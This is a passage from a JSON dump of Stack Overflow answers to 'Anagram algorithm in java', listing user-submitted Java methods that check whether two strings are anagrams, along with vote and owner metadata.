\tcharMap[c2]--;\r\n        }\r\n        for (int i = 0; i &lt; charMap.length; i++) {\r\n        \tif (charMap[i] != 0) return false;\r\n        }\r\n        return true;\r\n    }\r\n\r\nThis code basically increments and decrements an index location in an array corresponding to a character. If any of the array elements are non-zero at the end of the iteration, there were an unequal amount of increments and decrements, and therefore the strings contain differing characters and cannot be anagrams of each other.\r\n\r\nGiven that this algorithm iterates the two same sized strings once, runtime is O(n). Space complexity is O(1) as the charMap is always constant depending on charset requirements.","title":"Anagram algorithm in java","body":"<p>Below is a concise code snippet that determines whether two strings are anagrams in a single iteration of both strings, plus a final iteration of a 256 element array. This approach avoids sorting the characters in the strings and converting to/from Strings/char arrays by recording character counts in a mapping array.</p>\n\n<pre><code>static boolean isAnagram(String s1, String s2) {\n    if (s1.length() != s2.length()) return false;\n    int n = s1.length();\n    int[] charMap = new int[256];\n    for (int i = 0; i &lt; n; i++) {\n        char c1 = s1.charAt(i);\n        charMap[c1]++;\n        char c2 = s2.charAt(i);\n        charMap[c2]--;\n    }\n    for (int i = 0; i &lt; charMap.length; i++) {\n        if (charMap[i] != 0) return false;\n    }\n    return true;\n}\n</code></pre>\n\n<p>This code basically increments and decrements an index location in an array corresponding to a character. If any of the array elements are non-zero at the end of the iteration, there were an unequal amount of increments and decrements, and therefore the strings contain differing characters and cannot be anagrams of each other.</p>\n\n<p>Given that this algorithm iterates the two same sized strings once, runtime is O(n). Space complexity is O(1) as the charMap is always constant depending on charset requirements.</p>\n"},{"tags":[],"owner":{"account_id":4197370,"reputation":134,"user_id":3438461,"display_name":"indieNik"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1449730267,"creation_date":1444422397,"answer_id":33046584,"question_id":13692221,"body_markdown":"I took some time out to actually pen down the logic and write a code to check for two strings, if they are anagrams or not.\r\nOf course with the help of the above answers! XD\r\n\r\n\tpublic static void main(String[] args) {\r\n\r\n\t\tMap&lt;Character, Integer&gt; char_map = new HashMap&lt;Character, Integer&gt;();\r\n\t\tMap&lt;Character, Integer&gt; empty_map = new HashMap&lt;Character, Integer&gt;();\r\n\t\tString a = &quot;HelloP&quot;;\r\n\t\tString b = &quot;HePlol&quot;;\r\n\r\n        if (a.length() != b.length()) {\r\n\t\t\tSystem.out.println(&quot;false&quot;);\r\n\t\t\tSystem.exit(0);\r\n\t\t}\r\n\r\n\t\tfor (char c : a.toLowerCase().toCharArray()) {\r\n\t\t\tempty_map.put(c, 0);\r\n\t\t\tif (char_map.containsKey(c))\r\n\t\t\t\tchar_map.put(c, 1 + char_map.get(c));\r\n\t\t\telse\r\n\t\t\t\tchar_map.put(c, 1);\r\n\t\t}\r\n\r\n\t\tfor (char c : b.toLowerCase().toCharArray())\r\n\t\t\tif (char_map.containsKey(c))\r\n\t\t\t\tchar_map.put(c, char_map.get(c) - 1);\r\n\r\n\t\tSystem.out.println(char_map.equals(empty_map));\r\n\t}","title":"Anagram algorithm in java","body":"<p>I took some time out to actually pen down the logic and write a code to check for two strings, if they are anagrams or not.\nOf course with the help of the above answers! XD</p>\n\n<pre><code>public static void main(String[] args) {\n\n    Map&lt;Character, Integer&gt; char_map = new HashMap&lt;Character, Integer&gt;();\n    Map&lt;Character, Integer&gt; empty_map = new HashMap&lt;Character, Integer&gt;();\n    String a = \"HelloP\";\n    String b = \"HePlol\";\n\n    if (a.length() != b.length()) {\n        System.out.println(\"false\");\n        System.exit(0);\n    }\n\n    for (char c : a.toLowerCase().toCharArray()) {\n        empty_map.put(c, 0);\n        if (char_map.containsKey(c))\n            char_map.put(c, 1 + char_map.get(c));\n        else\n            char_map.put(c, 1);\n    }\n\n    for (char c : b.toLowerCase().toCharArray())\n        if (char_map.containsKey(c))\n            char_map.put(c, char_map.get(c) - 1);\n\n    System.out.println(char_map.equals(empty_map));\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2630549,"reputation":76,"user_id":2276618,"display_name":"Vishnu Vasudevan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1453455972,"creation_date":1453455972,"answer_id":34943538,"question_id":13692221,"body_markdown":"I think this works with complexity O(2n)\r\n\r\n    public static boolean isAnagram(String str1, String str2){\r\n\t\tif(str1.length() != str2.length()){ return false;}\r\n\t\tint[] buffer = new int[256];\r\n\t\tfor(char ch : str1.toCharArray()){\r\n\t\t\tbuffer[ch]++;\r\n\t\t}\r\n\t\tfor(char ch : str2.toCharArray()){\r\n\t\t\tif(buffer[ch]==0) return false;\r\n\t\t\tbuffer[ch] = (buffer[ch] &gt; 0)?(buffer[ch] - 1 ): -1 ;\t\r\n\t\t}\r\n\t\treturn true;\r\n\t}","title":"Anagram algorithm in java","body":"<p>I think this works with complexity O(2n)</p>\n\n<pre><code>public static boolean isAnagram(String str1, String str2){\n    if(str1.length() != str2.length()){ return false;}\n    int[] buffer = new int[256];\n    for(char ch : str1.toCharArray()){\n        buffer[ch]++;\n    }\n    for(char ch : str2.toCharArray()){\n        if(buffer[ch]==0) return false;\n        buffer[ch] = (buffer[ch] &gt; 0)?(buffer[ch] - 1 ): -1 ;   \n    }\n    return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7572098,"reputation":183,"user_id":5745627,"accept_rate":86,"display_name":"Jing Ma"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1468015711,"creation_date":1468015711,"answer_id":38276051,"question_id":13692221,"body_markdown":"This is a Java implementation that I wrote for using an array instead of a HashMap. This saves space, plus arrays are really fast.\r\n\r\n    public static boolean anagram(String s, String t) { \r\n            if (s.length() != t.length()) return false;\r\n            \r\n            int[] arr = new int[123];\r\n            for (char c : s.toCharArray())\r\n                arr[c]++;\r\n            for (char c : t.toCharArray())\r\n                arr[c]--;\r\n            for (int i : arr)\r\n                if (i != 0)\r\n                    return false;\r\n            return true;\r\n        }","title":"Anagram algorithm in java","body":"<p>This is a Java implementation that I wrote for using an array instead of a HashMap. This saves space, plus arrays are really fast.</p>\n\n<pre><code>public static boolean anagram(String s, String t) { \n        if (s.length() != t.length()) return false;\n\n        int[] arr = new int[123];\n        for (char c : s.toCharArray())\n            arr[c]++;\n        for (char c : t.toCharArray())\n            arr[c]--;\n        for (int i : arr)\n            if (i != 0)\n                return false;\n        return true;\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9445283,"reputation":31,"user_id":7024280,"display_name":"Shiva Sagan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1476553345,"creation_date":1476553345,"answer_id":40062254,"question_id":13692221,"body_markdown":"    import java.util.Scanner;\r\n    \r\n    public class JavaProgram\r\n    {\r\n        public static void main(String[] input)\r\n        {\r\n            String str1, str2;\r\n            int len, len1, len2, i, j, found=0, not_found=0;\r\n            Scanner scan = new Scanner(System.in);\r\n            \r\n            System.out.print(&quot;Enter First String : &quot;);\r\n            str1 = scan.nextLine();\r\n            System.out.print(&quot;Enter Second String : &quot;);\r\n            str2 = scan.nextLine();\r\n            \r\n            len1 = str1.length();\r\n            len2 = str2.length();\r\n    \t\t\r\n            if(len1 == len2)\r\n            {\r\n                len = len1;\r\n                for(i=0; i&lt;len; i++)\r\n                {\r\n                    found = 0;\r\n                    for(j=0; j&lt;len; j++)\r\n                    {\r\n                        if(str1.charAt(i) == str2.charAt(j))\r\n                        {\r\n                            found = 1;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if(found == 0)\r\n                    {\r\n                        not_found = 1;\r\n                        break;\r\n                    }\r\n                }\r\n                if(not_found == 1)\r\n                {\r\n                    System.out.print(&quot;Strings are not Anagram to Each Other..!!&quot;);\r\n                }\r\n                else\r\n                {\r\n                    System.out.print(&quot;Strings are Anagram&quot;);\r\n                }\r\n            }\r\n            else\r\n            {\r\n                System.out.print(&quot;Both Strings Must have the same number of Character to be an Anagram&quot;);\r\n            }\r\n        }\r\n    }\r\n\r\n","title":"Anagram algorithm in java","body":"<pre><code>import java.util.Scanner;\n\npublic class JavaProgram\n{\n    public static void main(String[] input)\n    {\n        String str1, str2;\n        int len, len1, len2, i, j, found=0, not_found=0;\n        Scanner scan = new Scanner(System.in);\n\n        System.out.print(\"Enter First String : \");\n        str1 = scan.nextLine();\n        System.out.print(\"Enter Second String : \");\n        str2 = scan.nextLine();\n\n        len1 = str1.length();\n        len2 = str2.length();\n\n        if(len1 == len2)\n        {\n            len = len1;\n            for(i=0; i&lt;len; i++)\n            {\n                found = 0;\n                for(j=0; j&lt;len; j++)\n                {\n                    if(str1.charAt(i) == str2.charAt(j))\n                    {\n                        found = 1;\n                        break;\n                    }\n                }\n                if(found == 0)\n                {\n                    not_found = 1;\n                    break;\n                }\n            }\n            if(not_found == 1)\n            {\n                System.out.print(\"Strings are not Anagram to Each Other..!!\");\n            }\n            else\n            {\n                System.out.print(\"Strings are Anagram\");\n            }\n        }\n        else\n        {\n            System.out.print(\"Both Strings Must have the same number of Character to be an Anagram\");\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10174229,"reputation":1,"user_id":7513500,"display_name":"Henry Orunkoya"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1486160040,"creation_date":1486158801,"answer_id":42033604,"question_id":13692221,"body_markdown":"    public class Anagram {\r\n    \tpublic boolean isAnagram(\r\n    \t\t\tString left, \r\n    \t\t\tString right) {\r\n    \t\tif (left.length() == right.length()) {\r\n    \t\t\tMap&lt;Character, Integer&gt; map = new HashMap&lt;&gt;();\r\n    \t\t\tchar[] a = left.toCharArray(), b = right.toCharArray();\r\n    \t\t\tfor (int i = 0; i &lt; a.length; i++) {\r\n    \t\t\t\taccumulate(map, a[i]);\r\n    \t\t\t\taccumulate(map, b[i]);\r\n    \t\t\t}\r\n    \t\t\tfor (char c : map.keySet()) {\r\n    \t\t\t\tif (map.get(c) &gt; 0) {\r\n    \t\t\t\t\treturn false;\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \t\t\treturn true;\r\n    \t\t} else {\r\n    \t\t\treturn false;\r\n    \t\t}\r\n    \t}\r\n    \r\n    \tprivate void accumulate(\r\n    \t\t\tMap&lt;Character, Integer&gt; map, \r\n    \t\t\tchar key) {\r\n    \t\tif (map.containsKey(key)) {\r\n    \t\t\tmap.put(key, Math.abs(map.get(key) - 1));\r\n    \t\t} else {\r\n    \t\t\tmap.put(key, 1);\r\n    \t\t}\r\n    \t}\r\n    }","title":"Anagram algorithm in java","body":"<pre><code>public class Anagram {\n    public boolean isAnagram(\n            String left, \n            String right) {\n        if (left.length() == right.length()) {\n            Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;();\n            char[] a = left.toCharArray(), b = right.toCharArray();\n            for (int i = 0; i &lt; a.length; i++) {\n                accumulate(map, a[i]);\n                accumulate(map, b[i]);\n            }\n            for (char c : map.keySet()) {\n                if (map.get(c) &gt; 0) {\n                    return false;\n                }\n            }\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    private void accumulate(\n            Map&lt;Character, Integer&gt; map, \n            char key) {\n        if (map.containsKey(key)) {\n            map.put(key, Math.abs(map.get(key) - 1));\n        } else {\n            map.put(key, 1);\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7109398,"reputation":31,"user_id":5437905,"display_name":"Sabuhi Yusif"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1489961405,"creation_date":1489961405,"answer_id":42892912,"question_id":13692221,"body_markdown":"Here is my solution from your aspect\r\n\r\n    private static boolean isAnagram(String s1, String s2){\r\n        int count = 0;\r\n        boolean flag = false;\r\n\r\n        if(s1.length() != s2.length()){\r\n            return false;\r\n        }\r\n        //checks whether both word&#39;s letters are the same\r\n        for (int i = 0; i &lt; s1.length(); i++){\r\n            for (int j = 0; j &lt; s2.length(); j++){\r\n                if(s1.charAt(i) == s2.charAt(j)){\r\n                    count++;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        //if count equals to one of the Strings length then it is an anagram\r\n        if(count == s2.length() ){\r\n            flag = true;\r\n        }\r\n        return flag;\r\n    }","title":"Anagram algorithm in java","body":"<p>Here is my solution from your aspect</p>\n\n<pre><code>private static boolean isAnagram(String s1, String s2){\n    int count = 0;\n    boolean flag = false;\n\n    if(s1.length() != s2.length()){\n        return false;\n    }\n    //checks whether both word's letters are the same\n    for (int i = 0; i &lt; s1.length(); i++){\n        for (int j = 0; j &lt; s2.length(); j++){\n            if(s1.charAt(i) == s2.charAt(j)){\n                count++;\n                break;\n            }\n        }\n    }\n    //if count equals to one of the Strings length then it is an anagram\n    if(count == s2.length() ){\n        flag = true;\n    }\n    return flag;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3927980,"reputation":1,"user_id":3247631,"display_name":"rathangangaa"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1494606966,"creation_date":1494606966,"answer_id":43942582,"question_id":13692221,"body_markdown":"        String str1=&quot;Mother In Law&quot;;\r\n\t\tString str2=&quot;Hitler Woman&quot;;\r\n\t\tchar[] anag1=str1.replaceAll(&quot;\\\\s&quot;, &quot;&quot;).toLowerCase().toCharArray();\r\n\t\tchar[] anag2=str2.replaceAll(&quot;\\\\s&quot;, &quot;&quot;).toLowerCase().toCharArray();\r\n\t\tArrays.sort(anag1);\r\n\t\tArrays.sort(anag2);\r\n\t\tSystem.out.println(Arrays.equals(anag1, anag2)? &quot;words are anagrams&quot;:&quot;words are not anagrams&quot;);","title":"Anagram algorithm in java","body":"<pre><code>    String str1=\"Mother In Law\";\n    String str2=\"Hitler Woman\";\n    char[] anag1=str1.replaceAll(\"\\\\s\", \"\").toLowerCase().toCharArray();\n    char[] anag2=str2.replaceAll(\"\\\\s\", \"\").toLowerCase().toCharArray();\n    Arrays.sort(anag1);\n    Arrays.sort(anag2);\n    System.out.println(Arrays.equals(anag1, anag2)? \"words are anagrams\":\"words are not anagrams\");\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4167257,"reputation":11,"user_id":3415971,"display_name":"serge"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1529600798,"creation_date":1529600798,"answer_id":50974050,"question_id":13692221,"body_markdown":"\tpublic static boolean isAnagram(String s1, String s2) {\r\n\t\tboolean aux = true;\r\n\t\tif (s1.length() != s2.length()){\r\n\t\t\taux = false;\r\n\t\t}else{ \r\n\t\t\tfor (int i = 0; i &lt; s1.length(); i++)\r\n\t\t\t\tif(s2.toUpperCase().indexOf(s1.toUpperCase().substring(i, i+1)) == -1) aux = false;\r\n\t\t}\r\n\t\treturn aux;\r\n\t}","title":"Anagram algorithm in java","body":"<pre><code>public static boolean isAnagram(String s1, String s2) {\n    boolean aux = true;\n    if (s1.length() != s2.length()){\n        aux = false;\n    }else{ \n        for (int i = 0; i &lt; s1.length(); i++)\n            if(s2.toUpperCase().indexOf(s1.toUpperCase().substring(i, i+1)) == -1) aux = false;\n    }\n    return aux;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":13109236,"reputation":310,"user_id":9470880,"display_name":"Isurie"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1538723420,"creation_date":1538721984,"answer_id":52659787,"question_id":13692221,"body_markdown":"    import java.util.Scanner;\r\n    \r\n    public class Anagrams {\r\n\r\n    static boolean isAnagram(String a, String b) {\r\n        a = a.toLowerCase();\r\n        b = b.toLowerCase();\r\n        if (a.length() != b.length()) {\r\n            return false;\r\n        }\r\n\r\n        char[] chars = a.toCharArray();\r\n        for (char c : chars) {\r\n            int index = b.indexOf(c);\r\n            if (index != -1) {\r\n                b = b.substring(0, index) + b.substring(index + 1, b.length());\r\n            } else {\r\n                return false;\r\n            }\r\n        }\r\n        return b.isEmpty();\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        Scanner scan = new Scanner(System.in);\r\n        String a = scan.next();\r\n        String b = scan.next();\r\n        scan.close();\r\n        boolean ret = isAnagram(a, b);\r\n        System.out.println((ret) ? &quot;Anagrams&quot; : &quot;Not Anagrams&quot;);\r\n\r\n        }\r\n    }\r\n\r\n","title":"Anagram algorithm in java","body":"<pre><code>import java.util.Scanner;\n\npublic class Anagrams {\n\nstatic boolean isAnagram(String a, String b) {\n    a = a.toLowerCase();\n    b = b.toLowerCase();\n    if (a.length() != b.length()) {\n        return false;\n    }\n\n    char[] chars = a.toCharArray();\n    for (char c : chars) {\n        int index = b.indexOf(c);\n        if (index != -1) {\n            b = b.substring(0, index) + b.substring(index + 1, b.length());\n        } else {\n            return false;\n        }\n    }\n    return b.isEmpty();\n}\n\npublic static void main(String[] args) {\n    Scanner scan = new Scanner(System.in);\n    String a = scan.next();\n    String b = scan.next();\n    scan.close();\n    boolean ret = isAnagram(a, b);\n    System.out.println((ret) ? \"Anagrams\" : \"Not Anagrams\");\n\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6947469,"reputation":31,"user_id":5331350,"display_name":"Dharma"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1544671545,"creation_date":1544670436,"answer_id":53754489,"question_id":13692221,"body_markdown":"    public class SampleAnagram {\r\n    \t\r\n    \tpublic static void main(String ...s) {\r\n    \t\t\r\n    \t\t\r\n    \t\tString s1 = &quot;work&quot;;\r\n    \t\tString s2=&quot;kwro&quot;;\r\n    \t\t\r\n    \t\tSystem.out.println(s1.charAt(0));\r\n    \t\t\r\n    \t\tint s1L = s1.length();\r\n    \t\tint s2L = s2.length();\r\n    \t\t\r\n    \t\tint totalCount = 0;\r\n    \t\t\r\n    \t\t\tfor(int i=0;i&lt;s1L;i++) {\r\n    \t\t\t\t\r\n    \t\t\t\tfor(int j=0;j&lt;s2L;j++) {\r\n    \t\t\t\t\r\n    \t\t\t\tif(s1.charAt(i)==(s2.charAt(j))) {\r\n    \t\t\t\t\t\r\n    \t\t\t\t\ttotalCount = totalCount+1;\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\t\t\r\n    \t\t\tSystem.out.println(totalCount);\r\n    \t\t\t\r\n    \t\t\t\r\n    \t\t\tif(s1.length()==totalCount &amp;&amp; s2.length()==totalCount) {\r\n    \t\t\t\t\r\n    \t\t\t\tSystem.out.println(&quot;given the input as anagram&quot;);\r\n    \t\t\t}\r\n    \t\t\r\n    \t}\r\n    \t\r\n    \t\r\n    \r\n    }","title":"Anagram algorithm in java","body":"<pre><code>public class SampleAnagram {\n\n    public static void main(String ...s) {\n\n\n        String s1 = \"work\";\n        String s2=\"kwro\";\n\n        System.out.println(s1.charAt(0));\n\n        int s1L = s1.length();\n        int s2L = s2.length();\n\n        int totalCount = 0;\n\n            for(int i=0;i&lt;s1L;i++) {\n\n                for(int j=0;j&lt;s2L;j++) {\n\n                if(s1.charAt(i)==(s2.charAt(j))) {\n\n                    totalCount = totalCount+1;\n                }\n            }\n        }\n\n            System.out.println(totalCount);\n\n\n            if(s1.length()==totalCount &amp;&amp; s2.length()==totalCount) {\n\n                System.out.println(\"given the input as anagram\");\n            }\n\n    }\n\n\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10831179,"reputation":213,"user_id":7965517,"display_name":"George I. Tsopouridis"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1546184691,"creation_date":1546184387,"answer_id":53978974,"question_id":13692221,"body_markdown":"Here is another suggestion without initialising an int[256] but an int[26] for English alphabet.\r\n\r\n    public static void main(String[] args) {\r\n        System.out.println(isAnagram(&quot;restful&quot;, &quot;fluster&quot;));\r\n    }\r\n\r\n    static boolean isAnagram(String s1, String s2) {\r\n        if (s1.length() != s2.length()) {\r\n            return false;\r\n        }\r\n        int[] countArray = new int[26];\r\n        for (int i = 0; i &lt; s1.length(); i++) {\r\n            countArray[getIndex(i, s1)]++;\r\n            countArray[getIndex(i, s2)]--;\r\n        }\r\n        for (int i = 0; i &lt; countArray.length; i++) {\r\n            if (countArray[i] != 0) {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public static int getIndex(int position, String value) {\r\n        return value.charAt(position) - &#39;a&#39;;\r\n    }\r\n\r\nBest\r\nGeorge Tsopouridis\r\n\r\n","title":"Anagram algorithm in java","body":"<p>Here is another suggestion without initialising an int[256] but an int[26] for English alphabet.</p>\n\n<pre><code>public static void main(String[] args) {\n    System.out.println(isAnagram(\"restful\", \"fluster\"));\n}\n\nstatic boolean isAnagram(String s1, String s2) {\n    if (s1.length() != s2.length()) {\n        return false;\n    }\n    int[] countArray = new int[26];\n    for (int i = 0; i &lt; s1.length(); i++) {\n        countArray[getIndex(i, s1)]++;\n        countArray[getIndex(i, s2)]--;\n    }\n    for (int i = 0; i &lt; countArray.length; i++) {\n        if (countArray[i] != 0) {\n            return false;\n        }\n    }\n    return true;\n}\n\npublic static int getIndex(int position, String value) {\n    return value.charAt(position) - 'a';\n}\n</code></pre>\n\n<p>Best\nGeorge Tsopouridis</p>\n"},{"tags":[],"owner":{"account_id":1613951,"reputation":331,"user_id":1492159,"display_name":"pgardunoc"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1548617227,"creation_date":1548617227,"answer_id":54392035,"question_id":13692221,"body_markdown":"    public boolean checkAnagram(String s, String t) {\r\n        s = s.toLowerCase();\r\n        t = t.toLowerCase();\r\n\r\n        // We can ignore blanks\r\n        char[] word1 = s.replaceAll(&quot;\\\\s&quot;,&quot;&quot;).toCharArray();\r\n        char[] word2 = t.replaceAll(&quot;\\\\s&quot;,&quot;&quot;).toCharArray();\r\n\r\n        // Anagrams length should be the same\r\n        if (word1.length != word2.length) {\r\n            return false;\r\n        }\r\n\r\n        // Sorting arrays is pretty fast, it can be O(logn) \r\n        Arrays.sort(word1);\r\n        Arrays.sort(word2);\r\n\r\n        if (Arrays.equals(word1, word2)) {\r\n            return true;\r\n        }\r\n\r\n        return false;\r\n    }","title":"Anagram algorithm in java","body":"<pre><code>public boolean checkAnagram(String s, String t) {\n    s = s.toLowerCase();\n    t = t.toLowerCase();\n\n    // We can ignore blanks\n    char[] word1 = s.replaceAll(\"\\\\s\",\"\").toCharArray();\n    char[] word2 = t.replaceAll(\"\\\\s\",\"\").toCharArray();\n\n    // Anagrams length should be the same\n    if (word1.length != word2.length) {\n        return false;\n    }\n\n    // Sorting arrays is pretty fast, it can be O(logn) \n    Arrays.sort(word1);\n    Arrays.sort(word2);\n\n    if (Arrays.equals(word1, word2)) {\n        return true;\n    }\n\n    return false;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":13641975,"reputation":604,"user_id":9841848,"display_name":"Vhndaree"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1551247147,"creation_date":1551246710,"answer_id":54898885,"question_id":13692221,"body_markdown":"There is a various possible solution of determining if a string is Anagram or not.\r\n1. using `Array.sort()` predefined method\r\n\r\n    String string1 = &quot;abc&quot;;\r\n    String string2 = &quot;bca&quot;;\r\n    char[] chars = string1.toCharArray();\r\n    char[] chars2 = string2.toCharArray();\r\n    Arrays.sort(chars);\r\n    Arrays.sort(chars2);\r\n    string1 = new String(chars);\r\n    string2 = new String(chars2);\r\n    if (string1.equalsIgnoreCase(string2)) {\r\n      System.out.println(&quot;Anagram&quot;);\r\n    } else {\r\n      System.out.println(&quot;Not Anagram&quot;);\r\n    }\r\n\r\nTime complexity: `Ω(n log n)`\r\n2. By Iterative method\r\n\r\n    char [] charArray = str.toCharArray();\r\n    if(str.length() == str1.length()){\r\n        for(char ch : charArray){\r\n            if(str1.indexOf(ch) == -1){\r\n                System.out.println(&quot;Not Anagram&quot;);\r\n            } \r\n        }    \r\n        System.out.println(&quot;Anagram&quot;);\r\n    } else {\r\n        System.out.println(&quot;Not Anagram&quot;);\r\n    }\r\n\r\nTime complexity: `Ω(n)`\r\n\r\nThough, the first algorithm is more readable second algorithm really executes faster.\r\n\r\n","title":"Anagram algorithm in java","body":"<p>There is a various possible solution of determining if a string is Anagram or not.\n1. using <code>Array.sort()</code> predefined method</p>\n\n<pre><code>String string1 = \"abc\";\nString string2 = \"bca\";\nchar[] chars = string1.toCharArray();\nchar[] chars2 = string2.toCharArray();\nArrays.sort(chars);\nArrays.sort(chars2);\nstring1 = new String(chars);\nstring2 = new String(chars2);\nif (string1.equalsIgnoreCase(string2)) {\n  System.out.println(\"Anagram\");\n} else {\n  System.out.println(\"Not Anagram\");\n}\n</code></pre>\n\n<p>Time complexity: <code>Ω(n log n)</code>\n2. By Iterative method</p>\n\n<pre><code>char [] charArray = str.toCharArray();\nif(str.length() == str1.length()){\n    for(char ch : charArray){\n        if(str1.indexOf(ch) == -1){\n            System.out.println(\"Not Anagram\");\n        } \n    }    \n    System.out.println(\"Anagram\");\n} else {\n    System.out.println(\"Not Anagram\");\n}\n</code></pre>\n\n<p>Time complexity: <code>Ω(n)</code></p>\n\n<p>Though, the first algorithm is more readable second algorithm really executes faster.</p>\n"},{"tags":[],"owner":{"account_id":1042454,"reputation":2808,"user_id":1048185,"accept_rate":57,"display_name":"Ihor M."},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1553285343,"creation_date":1553285343,"answer_id":55307125,"question_id":13692221,"body_markdown":"    public static boolean isAnagram(String s1, String s2) {\r\n        if (s1.length() != s2.length()) {\r\n            return false;\r\n        }\r\n        Map&lt;Character, Integer&gt; frequencies = new HashMap&lt;&gt;();\r\n        for (int i = 0; i &lt; s1.length(); i++) {\r\n            if (frequencies.containsKey(s1.charAt(i))) {\r\n                frequencies.put(s1.charAt(i), frequencies.get(s1.charAt(i)) + 1);\r\n            } else {\r\n                frequencies.put(s1.charAt(i), 1);\r\n            }\r\n        }\r\n        for (int i = 0; i &lt; s2.length(); i++) {\r\n            if (frequencies.containsKey(s2.charAt(i))) {\r\n                int frequency = frequencies.get(s2.charAt(i));\r\n                if (--frequency == 0) {\r\n                    frequencies.remove(s2.charAt(i));\r\n                } else {\r\n                    frequencies.put(s2.charAt(i), frequencies.get(s2.charAt(i)) - 1);\r\n                }\r\n            }\r\n        }\r\n        return frequencies.isEmpty();\r\n    }","title":"Anagram algorithm in java","body":"<pre><code>public static boolean isAnagram(String s1, String s2) {\n    if (s1.length() != s2.length()) {\n        return false;\n    }\n    Map&lt;Character, Integer&gt; frequencies = new HashMap&lt;&gt;();\n    for (int i = 0; i &lt; s1.length(); i++) {\n        if (frequencies.containsKey(s1.charAt(i))) {\n            frequencies.put(s1.charAt(i), frequencies.get(s1.charAt(i)) + 1);\n        } else {\n            frequencies.put(s1.charAt(i), 1);\n        }\n    }\n    for (int i = 0; i &lt; s2.length(); i++) {\n        if (frequencies.containsKey(s2.charAt(i))) {\n            int frequency = frequencies.get(s2.charAt(i));\n            if (--frequency == 0) {\n                frequencies.remove(s2.charAt(i));\n            } else {\n                frequencies.put(s2.charAt(i), frequencies.get(s2.charAt(i)) - 1);\n            }\n        }\n    }\n    return frequencies.isEmpty();\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9475267,"reputation":115,"user_id":7044810,"display_name":"Sameer Shrestha"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1566443021,"creation_date":1566443021,"answer_id":57601511,"question_id":13692221,"body_markdown":"    Using HashMap\r\n    public boolean isAnagram(String word, String anagram) {\r\n        if (word.length() != anagram.length())\r\n            return false;\r\n\r\n        int count = 0;\r\n        Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;();\r\n\r\n        for (int i = 0; i &lt; word.length(); i++) {\r\n            if (!map.containsKey(word.charAt(i)))\r\n                map.put(word.charAt(i), 1);\r\n            else\r\n                map.put(word.charAt(i), map.get(word.charAt(i)) + 1);\r\n        }\r\n\r\n        for (int i = 0; i &lt; anagram.length(); i++) {\r\n            if (!map.containsKey(anagram.charAt(i)))\r\n                return false;\r\n            else if (map.get(anagram.charAt(i)) &gt;= 1)\r\n                map.put(anagram.charAt(i), map.get(anagram.charAt(i)) - 1);\r\n            else\r\n                return false;\r\n        }\r\n\r\n        return true;\r\n    }","title":"Anagram algorithm in java","body":"<pre><code>Using HashMap\npublic boolean isAnagram(String word, String anagram) {\n    if (word.length() != anagram.length())\n        return false;\n\n    int count = 0;\n    Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;();\n\n    for (int i = 0; i &lt; word.length(); i++) {\n        if (!map.containsKey(word.charAt(i)))\n            map.put(word.charAt(i), 1);\n        else\n            map.put(word.charAt(i), map.get(word.charAt(i)) + 1);\n    }\n\n    for (int i = 0; i &lt; anagram.length(); i++) {\n        if (!map.containsKey(anagram.charAt(i)))\n            return false;\n        else if (map.get(anagram.charAt(i)) &gt;= 1)\n            map.put(anagram.charAt(i), map.get(anagram.charAt(i)) - 1);\n        else\n            return false;\n    }\n\n    return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":717890,"reputation":3568,"user_id":648608,"accept_rate":82,"display_name":"karto"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1579632802,"creation_date":1579632802,"answer_id":59847505,"question_id":13692221,"body_markdown":"1. Compare lengths of both strings if equal\r\n2. Convert both strings to lowercase so you can compare efficiently\r\n3. Loop  to check if String1 contains a character in String2. \r\n4. Set a counter to the length of one of the strings and decrease -1 when there&#39;s a match\r\n\r\n\r\n    \tpublic boolean isAnagram(String s1, String s2) {\r\n\t\t\r\n\t\tif(s1.length() != s2.length()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t \r\n\t    int counter= s1.length();\r\n\t\ts1 = s1.toLowerCase();\r\n\t\ts2= 